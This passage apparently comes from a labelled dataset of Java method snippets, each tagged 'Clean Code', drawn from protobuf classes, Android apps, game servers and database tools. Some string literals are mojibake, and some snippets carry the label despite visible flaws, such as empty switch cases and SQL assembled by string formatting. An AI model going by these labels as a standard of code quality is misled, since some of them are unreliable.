        return ""璇ュ晢鍝佹墍灞炵殑搴楅摵鍒嗙被绂佺敤涓紝鍟嗗搧涓嶈兘杩涜涓婃灦鎿嶄綔"";
      }
    }
  }
  return null;
}
",0,Clean Code
"public VertexAiGeminiChatClient(VertexAI vertexAI){
  this(vertexAI,VertexAiGeminiChatOptions.builder().withModel(ChatModel.GEMINI_PRO_VISION).withTemperature(0.8f).build());
}
public VertexAiGeminiChatClient(VertexAI vertexAI,VertexAiGeminiChatOptions options){
  this(vertexAI,options,null);
}
public VertexAiGeminiChatClient(VertexAI vertexAI,VertexAiGeminiChatOptions options,FunctionCallbackContext functionCallbackContext){
  super(functionCallbackContext);
  Assert.notNull(vertexAI,""VertexAI must not be null"");
  Assert.notNull(options,""VertexAiGeminiChatOptions must not be null"");
  Assert.notNull(options.getModel(),""VertexAiGeminiChatOptions.modelName must not be null"");
  this.vertexAI=vertexAI;
  this.defaultOptions=options;
  this.generationConfig=toGenerationConfig(options);
}",0,Clean Code
"/** 
 * <code>optional int64 end_time = 7;</code>
 * @return whether the endTime field is set
 */
public boolean hasEndTime(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)104);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)42);
    output.writeMessageNoTag(rewardList);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.rewardList,rewardList);
  }
  output.endObject();
}",0,Clean Code
"public static AssistMonsterWave parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new AssistMonsterWave(),data).checkInitialized();
}
public static AssistMonsterWave parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new AssistMonsterWave(),input).checkInitialized();
}
public static AssistMonsterWave parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new AssistMonsterWave(),input).checkInitialized();
}
",0,Clean Code
"public void checkAnimation(){
  int t=getBackgroundTop();
  if (chatActivityEnterViewAnimateFromTop != 0 && t != chatActivityEnterViewAnimateFromTop) {
    int dy=animatedTop + chatActivityEnterViewAnimateFromTop - t;
    animatedTop=dy;
    forceUpdateOffsets=true;
    if (changeBoundAnimator != null) {
      changeBoundAnimator.removeAllListeners();
      changeBoundAnimator.cancel();
    }
    if (topView != null && topView.getVisibility() == View.VISIBLE) {
      topView.setTranslationY(animatedTop + (1f - topViewEnterProgress) * topView.getLayoutParams().height);
      if (topLineView != null) {
        topLineView.setTranslationY(animatedTop);
      }
    }
    PeerStoriesView.this.invalidate();
    changeBoundAnimator=ValueAnimator.ofFloat(dy,0);
    changeBoundAnimator.addUpdateListener(a -> {
      float top=(float)a.getAnimatedValue();
      animatedTop=(int)top;
      forceUpdateOffsets=true;
      PeerStoriesView.this.invalidate();
      invalidate();
    }
);
    changeBoundAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        PeerStoriesView.this.invalidate();
        animatedTop=0;
        forceUpdateOffsets=true;
        if (topView != null && topView.getVisibility() == View.VISIBLE) {
          topView.setTranslationY(animatedTop + (1f - topViewEnterProgress) * topView.getLayoutParams().height);
          if (topLineView != null) {
            topLineView.setTranslationY(animatedTop);
          }
        }
        changeBoundAnimator=null;
      }
    }
);
    changeBoundAnimator.setDuration(ChatListItemAnimator.DEFAULT_DURATION);
    changeBoundAnimator.setInterpolator(ChatListItemAnimator.DEFAULT_INTERPOLATOR);
    changeBoundAnimator.start();
    chatActivityEnterViewAnimateFromTop=0;
  }
  if (shouldAnimateEditTextWithBounds) {
    float dy=(messageEditTextPredrawHeigth - messageEditText.getMeasuredHeight()) + (messageEditTextPredrawScrollY - messageEditText.getScrollY());
    messageEditText.setOffsetY(messageEditText.getOffsetY() - dy);
    ValueAnimator a=ValueAnimator.ofFloat(messageEditText.getOffsetY(),0);
    a.addUpdateListener(animation -> messageEditText.setOffsetY((float)animation.getAnimatedValue()));
    if (messageEditTextAnimator != null) {
      messageEditTextAnimator.cancel();
    }
    messageEditTextAnimator=a;
    a.setDuration(ChatListItemAnimator.DEFAULT_DURATION);
    a.setInterpolator(ChatListItemAnimator.DEFAULT_INTERPOLATOR);
    a.start();
    shouldAnimateEditTextWithBounds=false;
  }
  lastContentViewHeight=getMeasuredHeight();
}",0,Clean Code
"@Override public GetQuestDataCsReq create(){
  return GetQuestDataCsReq.newInstance();
}
",0,Clean Code
"@Override public String getFeedVideoCoverUrl(){
  return this.mInfo.getFeedVideoCoverUrl();
}
",0,Clean Code
"public ProcessOutputStreamReader(final String name,final InputStream inStream){
  this.name=name;
  this.inStream=inStream;
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(bonusSelectInfo);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(miracleSelectInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=2 + ProtoSink.computeMessageSizeNoTag(buffSelectInfo);
  }
  return size;
}",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 7;</code>
 * @param value the retcode to set
 * @return this
 */
public SelectRogueBuffScRsp setRetcode(final int value){
  bitField0_|=0x00000002;
  retcode=value;
  return this;
}",0,Clean Code
"/** 
 * <code>optional string msg = 6;</code>
 * @return internal {@code Utf8String} representation of msg for reading
 */
public Utf8String getMsgBytes(){
  return this.msg;
}",0,Clean Code
"/** 
 * @author PhiPro
 * @reason Move large parts of the logic to other methods
 */
@Overwrite public void setLevel(long id,int level){
  int oldLevel=this.getLevel(id);
  if (oldLevel != 0 && level == 0) {
    this.readySections.add(id);
    this.markedReadySections.remove(id);
  }
  if (oldLevel == 0 && level != 0) {
    this.readySections.remove(id);
    this.markedNotReadySections.remove(id);
    this.untrackSection(id);
  }
  if (oldLevel >= 2 && level < 2) {
    this.nonOptimizableSections.add(id);
    if (this.enabledChunks.contains(ChunkSectionPos.withZeroY(id))) {
      if (!this.vanillaLightmapsToRemove.remove(id)) {
        if (this.getLightSection(id,true) == null) {
          this.storage.put(id,this.createTrivialVanillaLightmap(id));
          this.dirtySections.add(id);
          this.storage.clearCache();
        }
        this.trackSection(id);
      }
    }
 else {
      this.trackSection(id);
    }
  }
  if (oldLevel < 2 && level >= 2) {
    this.nonOptimizableSections.remove(id);
    if (this.enabledChunks.contains(ChunkSectionPos.withZeroY(id))) {
      final ChunkNibbleArray lightmap=this.getLightSection(id,true);
      if (lightmap != null && ((IReadonly)lightmap).isReadonly()) {
        this.vanillaLightmapsToRemove.add(id);
        this.markForLightUpdates();
      }
 else {
        this.untrackSection(id);
      }
    }
 else {
      this.untrackSection(id);
    }
  }
}",0,Clean Code
"public @Nullable String getHint(){
  return hint;
}
",0,Clean Code
"/** 
 * <code>optional .ItemList return_data = 7;</code>
 * @return whether the returnData field is set
 */
public boolean hasReturnData(){
  return (bitField0_ & 0x00000008) != 0;
}",0,Clean Code
"public List<String> getFieldData(ChartViewDTO view,Long fieldId,String fieldType) throws Exception {
  ChartExtRequest requestList=view.getChartExtRequest();
  List<String[]> sqlData=sqlData(view,requestList,fieldId);
  List<ChartViewFieldDTO> fieldList=new ArrayList<>();
switch (fieldType) {
case ""xAxis"":
    ;
case ""xAxisExt"":
  ;
case ""extStack"":
;
}
DatasetTableFieldDTO field=datasetTableFieldManage.selectById(fieldId);
List<String> res=new ArrayList<>();
if (ObjectUtils.isNotEmpty(field) && fieldList.size() > 0) {
ChartViewFieldDTO chartViewFieldDTO=null;
int index=0;
int getIndex=0;
for (int i=0; i < fieldList.size(); i++) {
ChartViewFieldDTO item=fieldList.get(i);
if (StringUtils.equalsIgnoreCase(item.getSort(),""custom_sort"")) {
  chartViewFieldDTO=item;
  index=i;
}
if (Objects.equals(item.getId(),field.getId())) {
  getIndex=i;
}
}
if (StringUtils.equalsIgnoreCase(fieldType,""xAxisExt"")) {
List<ChartViewFieldDTO> xAxis=view.getXAxis();
index+=xAxis.size();
getIndex+=xAxis.size();
}
if (StringUtils.equalsIgnoreCase(fieldType,""extStack"")) {
int xAxisSize=CollectionUtils.size(view.getXAxis());
int extSize=CollectionUtils.size(view.getXAxisExt());
index+=xAxisSize + extSize;
getIndex+=xAxisSize + extSize;
}
List<String[]> sortResult=resultCustomSort(fieldList,sqlData);
if (ObjectUtils.isNotEmpty(chartViewFieldDTO) && (getIndex >= index)) {
List<String[]> strings=customSort(Optional.ofNullable(chartViewFieldDTO.getCustomSort()).orElse(new ArrayList<>()),sortResult,index);
for (int i=0; i < strings.size(); i++) {
  res.add(strings.get(i)[getIndex]);
}
}
 else {
for (int i=0; i < sortResult.size(); i++) {
  res.add(sortResult.get(i)[getIndex]);
}
}
}
return res.stream().distinct().collect(Collectors.toList());
}",0,Clean Code
"protected int getCaretStartPosX(){
  return getCaret().getCaretStartPos();
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=2;
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=(1 * baseAvatarIdList.length()) + ProtoSink.computeRepeatedUInt32SizeNoTag(baseAvatarIdList);
  }
  return size;
}",0,Clean Code
"/** 
 * <code>optional uint32 equip_avatar_id = 14;</code>
 * @return whether the equipAvatarId field is set
 */
public boolean hasEquipAvatarId(){
  return (bitField0_ & 0x00000020) != 0;
}",0,Clean Code
"private Instrument getInstrumentFromSound(SoundEvent sound){
  String path=sound.getId().getPath();
  if (path.contains(""harp""))   return Instrument.HARP;
 else   if (path.contains(""basedrum""))   return Instrument.BASEDRUM;
 else   if (path.contains(""snare""))   return Instrument.SNARE;
 else   if (path.contains(""hat""))   return Instrument.HAT;
 else   if (path.contains(""bass""))   return Instrument.BASS;
 else   if (path.contains(""flute""))   return Instrument.FLUTE;
 else   if (path.contains(""bell""))   return Instrument.BELL;
 else   if (path.contains(""guitar""))   return Instrument.GUITAR;
 else   if (path.contains(""chime""))   return Instrument.CHIME;
 else   if (path.contains(""xylophone""))   return Instrument.XYLOPHONE;
 else   if (path.contains(""iron_xylophone""))   return Instrument.IRON_XYLOPHONE;
 else   if (path.contains(""cow_bell""))   return Instrument.COW_BELL;
 else   if (path.contains(""didgeridoo""))   return Instrument.DIDGERIDOO;
 else   if (path.contains(""bit""))   return Instrument.BIT;
 else   if (path.contains(""banjo""))   return Instrument.BANJO;
 else   if (path.contains(""pling""))   return Instrument.PLING;
  return null;
}
",0,Clean Code
"public void setClientId(String clientId){
  this.clientId=clientId;
}
",0,Clean Code
"@Override public void setup(){
}
",0,Clean Code
"protected <V>V fromJson(String value,Class<V> returnType){
  if (null == value) {
    return null;
  }
  try {
    return objectMapper.readValue(value,returnType);
  }
 catch (  IOException ex) {
    throw new NonTransientException(""Could not convert JSON '"" + value + ""' to ""+ returnType.getName(),ex);
  }
}
",0,Clean Code
"@Override public void updateTask(String workflowId,String taskId,String[] keys,Object[] values){
}
",0,Clean Code
"public ArrayList<SearchRspGroupInfo> getGroupInfos(){
  return this.groupInfos;
}
",0,Clean Code
"public String toString(){
  return ""GProSearchUser{nick="" + this.nick + "",tinyId=""+ this.tinyId+ "",avatar=""+ this.avatar+ "",}"";
}
",0,Clean Code
"public PacketGetCurLineupDataScRsp(GameSession session){
  super(CmdId.GetCurLineupDataScRsp);
  var data=GetCurLineupDataScRsp.newInstance().setLineup(session.getPlayer().getCurrentLineup().toProto());
  this.setData(data);
}
",0,Clean Code
"@Override public String getDbType(){
  return ""SQLSERVER"";
}
",0,Clean Code
"@Test void should_generate_answer_and_return_token_usage_and_finish_reason_stop(){
  UserMessage userMessage=userMessage(""What is the capital of Germany?"");
  Response<AiMessage> response=model.generate(userMessage);
  System.out.println(response);
  assertThat(response.content().text()).contains(""Berlin"");
  TokenUsage tokenUsage=response.tokenUsage();
  assertThat(tokenUsage.inputTokenCount()).isEqualTo(14);
  assertThat(tokenUsage.outputTokenCount()).isGreaterThan(1);
  assertThat(tokenUsage.totalTokenCount()).isEqualTo(tokenUsage.inputTokenCount() + tokenUsage.outputTokenCount());
  assertThat(response.finishReason()).isEqualTo(STOP);
}",0,Clean Code
"@Override public boolean hasElement(SecurityManager manager,URI uri) throws SecurityManagerException {
  manager.checkResolveModule(uri);
  var uriPath=uri.getPath();
  assert uriPath.charAt(0) == '/';
  return classLoader.getResource(uriPath.substring(1)) != null;
}",0,Clean Code
"@Override public Integer getHeight(){
  return this.height;
}
",0,Clean Code
"public String toString(){
  return ""GProGetRecommendHotRsp{recommendList="" + this.recommendList + "",extInfo=""+ this.extInfo+ "",cookies=""+ this.cookies+ "",}"";
}
",0,Clean Code
"@Transactional(rollbackFor=Exception.class) @Override public void deletion(UserDeletionReqDTO requestParam){
  String username=UserContext.getUsername();
  if (!Objects.equals(username,requestParam.getUsername())) {
    throw new ClientException(""娉ㄩ攢璐﹀彿涓庣櫥褰曡处鍙蜂笉涓�鑷�"");
  }
  RLock lock=redissonClient.getLock(USER_DELETION + requestParam.getUsername());
  lock.lock();
  try {
    UserQueryRespDTO userQueryRespDTO=userService.queryUserByUsername(username);
    UserDeletionDO userDeletionDO=UserDeletionDO.builder().idType(userQueryRespDTO.getIdType()).idCard(userQueryRespDTO.getIdCard()).build();
    userDeletionMapper.insert(userDeletionDO);
    UserDO userDO=new UserDO();
    userDO.setDeletionTime(System.currentTimeMillis());
    userDO.setUsername(username);
    userMapper.deletionUser(userDO);
    UserPhoneDO userPhoneDO=UserPhoneDO.builder().phone(userQueryRespDTO.getPhone()).deletionTime(System.currentTimeMillis()).build();
    userPhoneMapper.deletionUser(userPhoneDO);
    if (StrUtil.isNotBlank(userQueryRespDTO.getMail())) {
      UserMailDO userMailDO=UserMailDO.builder().mail(userQueryRespDTO.getMail()).deletionTime(System.currentTimeMillis()).build();
      userMailMapper.deletionUser(userMailDO);
    }
    distributedCache.delete(UserContext.getToken());
    userReuseMapper.insert(new UserReuseDO(username));
    StringRedisTemplate instance=(StringRedisTemplate)distributedCache.getInstance();
    instance.opsForSet().add(USER_REGISTER_REUSE_SHARDING + hashShardingIdx(username),username);
  }
  finally {
    lock.unlock();
  }
}
",0,Clean Code
"@ScriptInterface public static long getDayOfWeekTimeFlag(int dayOfWeek){
  return getDayOfWeekTimeFlag(GlobalAppContext.get(),dayOfWeek);
}
public static long getDayOfWeekTimeFlag(Context context,int dayOfWeek){
  dayOfWeek=(dayOfWeek - 1) % 7 + 1;
switch (dayOfWeek) {
case DateTimeConstants.SUNDAY:
    return FLAG_SUNDAY;
case DateTimeConstants.MONDAY:
  return FLAG_MONDAY;
case DateTimeConstants.SATURDAY:
return FLAG_SATURDAY;
case DateTimeConstants.WEDNESDAY:
return FLAG_WEDNESDAY;
case DateTimeConstants.TUESDAY:
return FLAG_TUESDAY;
case DateTimeConstants.THURSDAY:
return FLAG_THURSDAY;
case DateTimeConstants.FRIDAY:
return FLAG_FRIDAY;
}
throw new IllegalArgumentException(context.getString(R.string.error_illegal_argument,""dayOfWeek"",String.valueOf(dayOfWeek)));
}",0,Clean Code
"public String getClientName(){
  return this.clientName;
}
",0,Clean Code
"@Override public void onNext(String token){
  throw new RuntimeException(""Not implemented"");
}
",0,Clean Code
"private SpannableStringBuilder cleanUpText(SpannableStringBuilder builder){
  int builderLength=builder.length();
  for (int i=0; i < builderLength; i++) {
    if (builder.charAt(i) == ' ') {
      int j=i + 1;
      while (j < builder.length() && builder.charAt(j) == ' ') {
        j++;
      }
      int spacesToDelete=j - (i + 1);
      if (spacesToDelete > 0) {
        builder.delete(i,i + spacesToDelete);
        builderLength-=spacesToDelete;
      }
    }
  }
  if (builderLength > 0 && builder.charAt(0) == ' ') {
    builder.delete(0,1);
    builderLength--;
  }
  for (int i=0; i < builderLength - 1; i++) {
    if (builder.charAt(i) == '\n' && builder.charAt(i + 1) == ' ') {
      builder.delete(i + 1,i + 2);
      builderLength--;
    }
  }
  if (builderLength > 0 && builder.charAt(builderLength - 1) == ' ') {
    builder.delete(builderLength - 1,builderLength);
    builderLength--;
  }
  for (int i=0; i < builderLength - 1; i++) {
    if (builder.charAt(i) == ' ' && builder.charAt(i + 1) == '\n') {
      builder.delete(i,i + 1);
      builderLength--;
    }
  }
  if (builderLength > 0 && builder.charAt(builderLength - 1) == '\n') {
    builder.delete(builderLength - 1,builderLength);
  }
  return builder;
}",0,Clean Code
"public void setCrossCursor(final boolean cross){
  if (cross) {
    super.setViewCursor(Cursor.getPredefinedCursor(Cursor.MOVE_CURSOR));
  }
 else {
    super.setViewCursor(Cursor.getDefaultCursor());
  }
}
",0,Clean Code
"@Test public void testTimeStruct(){
  TimeStruct struct=new TimeStruct();
  struct.date=new Date();
  struct.sqlDate=new java.sql.Date(100);
  struct.time=new java.sql.Time(200);
  struct.timestamp=new Timestamp(300);
  struct.localDate=LocalDate.now();
  struct.localTime=LocalTime.now();
  struct.localDateTime=LocalDateTime.now();
  struct.instant=DateTimeUtils.truncateInstantToMicros(Instant.now());
  struct.duration=Duration.between(Instant.now(),Instant.ofEpochSecond(-1));
{
    Fury fury=Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
    fury.registerSerializer(TimeStruct.class,CodegenSerializer.loadCodegenSerializer(fury,TimeStruct.class));
    serDe(fury,struct);
  }
{
    Fury fury=Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
    fury.registerSerializer(TimeStruct.class,new ObjectSerializer(fury,TimeStruct.class));
    serDe(fury,struct);
  }
}",0,Clean Code
"/** 
 * <code>optional uint32 buy_times = 14;</code>
 * @param value the buyTimes to set
 * @return this
 */
public Goods setBuyTimes(final int value){
  bitField0_|=0x00000010;
  buyTimes=value;
  return this;
}",0,Clean Code
"public void fetchNewEmojiKeywords(String[] langCodes){
  if (langCodes == null) {
    return;
  }
  for (int a=0; a < langCodes.length; a++) {
    String langCode=langCodes[a];
    if (TextUtils.isEmpty(langCode)) {
      return;
    }
    if (currentFetchingEmoji.get(langCode) != null) {
      return;
    }
    currentFetchingEmoji.put(langCode,true);
    getMessagesStorage().getStorageQueue().postRunnable(() -> {
      int version=-1;
      String alias=null;
      long date=0;
      try {
        SQLiteCursor cursor=getMessagesStorage().getDatabase().queryFinalized(""SELECT alias, version, date FROM emoji_keywords_info_v2 WHERE lang = ?"",langCode);
        if (cursor.next()) {
          alias=cursor.stringValue(0);
          version=cursor.intValue(1);
          date=cursor.longValue(2);
        }
        cursor.dispose();
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      if (!BuildVars.DEBUG_VERSION && Math.abs(System.currentTimeMillis() - date) < 60 * 60 * 1000) {
        AndroidUtilities.runOnUIThread(() -> currentFetchingEmoji.remove(langCode));
        return;
      }
      TLObject request;
      if (version == -1) {
        TLRPC.TL_messages_getEmojiKeywords req=new TLRPC.TL_messages_getEmojiKeywords();
        req.lang_code=langCode;
        request=req;
      }
 else {
        TLRPC.TL_messages_getEmojiKeywordsDifference req=new TLRPC.TL_messages_getEmojiKeywordsDifference();
        req.lang_code=langCode;
        req.from_version=version;
        request=req;
      }
      String aliasFinal=alias;
      int versionFinal=version;
      getConnectionsManager().sendRequest(request,(response,error) -> {
        if (response != null) {
          TLRPC.TL_emojiKeywordsDifference res=(TLRPC.TL_emojiKeywordsDifference)response;
          if (versionFinal != -1 && !res.lang_code.equals(aliasFinal)) {
            getMessagesStorage().getStorageQueue().postRunnable(() -> {
              try {
                SQLitePreparedStatement deleteState=getMessagesStorage().getDatabase().executeFast(""DELETE FROM emoji_keywords_info_v2 WHERE lang = ?"");
                deleteState.bindString(1,langCode);
                deleteState.step();
                deleteState.dispose();
                AndroidUtilities.runOnUIThread(() -> {
                  currentFetchingEmoji.remove(langCode);
                  fetchNewEmojiKeywords(new String[]{langCode});
                }
);
              }
 catch (              Exception e) {
                FileLog.e(e);
              }
            }
);
          }
 else {
            putEmojiKeywords(langCode,res);
          }
        }
 else {
          AndroidUtilities.runOnUIThread(() -> currentFetchingEmoji.remove(langCode));
        }
      }
);
    }
);
  }
}",0,Clean Code
"public String toString(){
  return this.mInfo.toString();
}
",0,Clean Code
"public Triple(final S first,final T second,final U third){
  this.m_first=first;
  this.m_second=second;
  this.m_third=third;
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(energyInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(chargerInfo);
  }
  return size;
}",0,Clean Code
"void onShutUpMemberListChanged(long j2,ArrayList<MemberInfo> arrayList);",0,Clean Code
"/** 
 * @param created the created to set
 */
public void setCreated(long created){
  this.created=created;
}
",0,Clean Code
"private SelectJoinStep<Record2<Long,String>> getConditionsForFilters(final SelectJoinStep<Record2<Long,String>> table,final List<Long> datasourceIds,final List<Long> namespaceIds,final List<Long> ownerIds,final List<Long> titleIds,final List<Long> tagIds){
  if (CollectionUtils.isNotEmpty(datasourceIds) || CollectionUtils.isNotEmpty(namespaceIds)) {
    if (CollectionUtils.isNotEmpty(datasourceIds)) {
      table.join(DATA_SOURCE).on(DATA_SOURCE.ID.in(datasourceIds).and(DATA_SOURCE.ID.eq(DATA_ENTITY.DATA_SOURCE_ID)));
    }
 else {
      table.join(DATA_SOURCE).on(DATA_SOURCE.ID.eq(DATA_ENTITY.DATA_SOURCE_ID));
    }
    if (CollectionUtils.isNotEmpty(namespaceIds)) {
      table.join(NAMESPACE).on(NAMESPACE.ID.in(namespaceIds).and(NAMESPACE.ID.eq(DATA_ENTITY.NAMESPACE_ID).or(NAMESPACE.ID.eq(DATA_SOURCE.NAMESPACE_ID))));
    }
  }
  if (CollectionUtils.isNotEmpty(ownerIds) || CollectionUtils.isNotEmpty(titleIds)) {
    if (CollectionUtils.isNotEmpty(ownerIds) && CollectionUtils.isNotEmpty(titleIds)) {
      table.join(OWNERSHIP).on(OWNERSHIP.OWNER_ID.in(ownerIds).and(OWNERSHIP.TITLE_ID.in(titleIds)).and(OWNERSHIP.DATA_ENTITY_ID.eq(DATA_ENTITY.ID)));
    }
 else     if (CollectionUtils.isNotEmpty(ownerIds)) {
      table.join(OWNERSHIP).on(OWNERSHIP.OWNER_ID.in(ownerIds).and(OWNERSHIP.DATA_ENTITY_ID.eq(DATA_ENTITY.ID)));
    }
 else {
      table.join(OWNERSHIP).on(OWNERSHIP.TITLE_ID.in(titleIds).and(OWNERSHIP.DATA_ENTITY_ID.eq(DATA_ENTITY.ID)));
    }
  }
  if (CollectionUtils.isNotEmpty(tagIds)) {
    table.join(TAG_TO_DATA_ENTITY).on(TAG_TO_DATA_ENTITY.TAG_ID.in(tagIds).and(TAG_TO_DATA_ENTITY.DATA_ENTITY_ID.eq(DATA_ENTITY.ID)));
  }
  return table;
}",0,Clean Code
"@Override @SuppressLint(""ClickableViewAccessibility"") public boolean onTouch(View v,MotionEvent e){
  if (v == qButtonCaps) {
    performCaps(e);
    return true;
  }
  if (v == qButtonLShift || v == qButtonRShift) {
    if (enableType) {
      performShift(e);
      return true;
    }
 else {
    }
  }
  if (v == textSignalType) {
    performType(e);
    return true;
  }
  if (v instanceof QwertButton) {
    if (enableType) {
      sendCharEvent((QwertButton)v,e);
    }
 else {
      sendKeyEvent(v,e);
    }
    return true;
  }
  if (v == onscreenKeyboard && moveable) {
    moveViewByTouch(v,e);
    return true;
  }
  return false;
}
",0,Clean Code
"public String getQuality(){
  return this.quality;
}
",0,Clean Code
"@Override public StreamInfo getDownLoadInfo(String deviceId,String channelId,String stream){
  InviteInfo inviteInfo=inviteStreamService.getInviteInfo(InviteSessionType.DOWNLOAD,deviceId,channelId,stream);
  if (inviteInfo == null || inviteInfo.getStreamInfo() == null) {
    logger.warn(""[鑾峰彇涓嬭浇杩涘害] 鏈煡璇㈠埌褰曞儚涓嬭浇鐨勪俊鎭�"");
    return null;
  }
  if (inviteInfo.getStreamInfo().getProgress() == 1) {
    return inviteInfo.getStreamInfo();
  }
  String mediaServerId=inviteInfo.getStreamInfo().getMediaServerId();
  MediaServer mediaServerItem=mediaServerService.getOne(mediaServerId);
  if (mediaServerItem == null) {
    logger.warn(""[鑾峰彇涓嬭浇杩涘害] 鏌ヨ褰曞儚淇℃伅鏃跺彂鐜拌妭鐐逛笉瀛樺湪"");
    return null;
  }
  SsrcTransaction ssrcTransaction=streamSession.getSsrcTransaction(deviceId,channelId,null,stream);
  if (ssrcTransaction == null) {
    logger.warn(""[鑾峰彇涓嬭浇杩涘害] 涓嬭浇宸茬粨鏉�"");
    return null;
  }
  String app=""rtp"";
  MediaInfo mediaInfo=mediaServerService.getMediaInfo(mediaServerItem,app,stream);
  if (mediaInfo == null) {
    logger.warn(""[鑾峰彇涓嬭浇杩涘害] 鏌ヨ杩涘害澶辫触, 鑺傜偣Id锛� {}锛� {}/{}"",mediaServerId,app,stream);
    return null;
  }
  if (mediaInfo.getDuration() == 0) {
    inviteInfo.getStreamInfo().setProgress(0);
  }
 else {
    String startTime=inviteInfo.getStreamInfo().getStartTime();
    String endTime=inviteInfo.getStreamInfo().getEndTime();
    long start=DateUtil.yyyy_MM_dd_HH_mm_ssToTimestamp(startTime);
    long end=DateUtil.yyyy_MM_dd_HH_mm_ssToTimestamp(endTime);
    BigDecimal currentCount=new BigDecimal(mediaInfo.getDuration());
    BigDecimal totalCount=new BigDecimal((end - start) * 1000);
    BigDecimal divide=currentCount.divide(totalCount,2,RoundingMode.HALF_UP);
    double process=divide.doubleValue();
    if (process > 0.999) {
      process=1.0;
    }
    inviteInfo.getStreamInfo().setProgress(process);
  }
  inviteStreamService.updateInviteInfo(inviteInfo);
  return inviteInfo.getStreamInfo();
}",0,Clean Code
"public String getJmpUrl(){
  return this.jmpUrl;
}
",0,Clean Code
"public List<String> getStop(){
  return this.stop;
}
",0,Clean Code
"public Set<String> getValNames(){
  return valNames;
}
",0,Clean Code
"@Override public String toString(){
  return ""QueryHistorySalaryDetailBO{"" + ""sRecordId="" + sRecordId + "", employeeName='""+ employeeName+ '\''+ "", jobNumber='""+ jobNumber+ '\''+ "", deptId=""+ deptId+ '}';
}
",0,Clean Code
"private static float lvqCosine256(ArrayVectorFloat vector,LocallyAdaptiveVectorQuantization.PackedVector packedVector,ArrayVectorFloat centroid){
  var length=vector.length();
  final int vectorizedLength=FloatVector.SPECIES_256.loopBound(length);
  var sequenceBacking=(ArrayByteSequence)packedVector.bytes;
  int i=0;
  IntVector packedFragmentA=null;
  IntVector packedFragmentB=null;
  FloatVector lvqFloats;
  var vsum=FloatVector.zero(FloatVector.SPECIES_256);
  var vFullMagnitude=FloatVector.zero(FloatVector.SPECIES_256);
  var vLvqMagnitude=FloatVector.zero(FloatVector.SPECIES_256);
  for (; i < vectorizedLength; i+=FloatVector.SPECIES_256.length()) {
    FloatVector fullVector=FloatVector.fromArray(FloatVector.SPECIES_256,vector.get(),i);
    FloatVector centroidVector=FloatVector.fromArray(FloatVector.SPECIES_256,centroid.get(),i);
    if (i % 64 == 0) {
      var tempBytes=ByteVector.fromArray(ByteVector.SPECIES_256,sequenceBacking.get(),i);
      packedFragmentA=tempBytes.reinterpretAsInts();
      tempBytes=ByteVector.fromArray(ByteVector.SPECIES_256,sequenceBacking.get(),i + 32);
      packedFragmentB=tempBytes.reinterpretAsInts();
      lvqFloats=(FloatVector)packedFragmentA.lanewise(VectorOperators.AND,0xff).convert(VectorOperators.I2F,0);
    }
 else     if (i % 16 == 0) {
      packedFragmentA=packedFragmentA.lanewise(VectorOperators.LSHR,8);
      packedFragmentB=packedFragmentB.lanewise(VectorOperators.LSHR,8);
      lvqFloats=(FloatVector)packedFragmentA.lanewise(VectorOperators.AND,0xff).convert(VectorOperators.I2F,0);
    }
 else {
      lvqFloats=(FloatVector)packedFragmentB.lanewise(VectorOperators.AND,0xff).convert(VectorOperators.I2F,0);
    }
    lvqFloats=lvqFloats.fma(packedVector.scale,packedVector.bias);
    lvqFloats=lvqFloats.add(centroidVector);
    vsum=fullVector.fma(lvqFloats,vsum);
    vFullMagnitude=fullVector.fma(fullVector,vFullMagnitude);
    vLvqMagnitude=lvqFloats.fma(lvqFloats,vLvqMagnitude);
  }
  float sum=vsum.reduceLanes(VectorOperators.ADD);
  float fullMagnitude=vFullMagnitude.reduceLanes(VectorOperators.ADD);
  float lvqMagnitude=vLvqMagnitude.reduceLanes(VectorOperators.ADD);
  for (; i < length; ++i) {
    var lvqVal=packedVector.getDequantized(i) + centroid.get(i);
    var fullVal=vector.get(i);
    sum+=fullVal * lvqVal;
    fullMagnitude+=fullVal * fullVal;
    lvqMagnitude+=lvqVal * lvqVal;
  }
  return (float)(sum / Math.sqrt(fullMagnitude * lvqMagnitude));
}",0,Clean Code
"public int getAllComboCnt(){
  return this.allComboCnt;
}
",0,Clean Code
"@Override public Function function(Connection connection,@NotEmpty String databaseName,String schemaName,String functionName){
  String functionInfoSql=String.format(ROUTINES_SQL,""FUNCTION"",databaseName,functionName);
  Function function=SQLExecutor.getInstance().execute(connection,functionInfoSql,resultSet -> {
    Function f=new Function();
    f.setDatabaseName(databaseName);
    f.setSchemaName(schemaName);
    f.setFunctionName(functionName);
    if (resultSet.next()) {
      f.setSpecificName(resultSet.getString(""SPECIFIC_NAME""));
